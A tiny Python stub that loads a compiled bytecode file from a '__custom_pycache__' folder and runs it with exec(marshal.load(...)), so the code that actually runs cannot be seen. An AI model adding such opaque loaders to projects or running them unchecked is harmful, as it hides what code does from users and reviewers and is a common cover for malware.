
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Entity_51444ce5f4454a068548cf354d00ed50.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
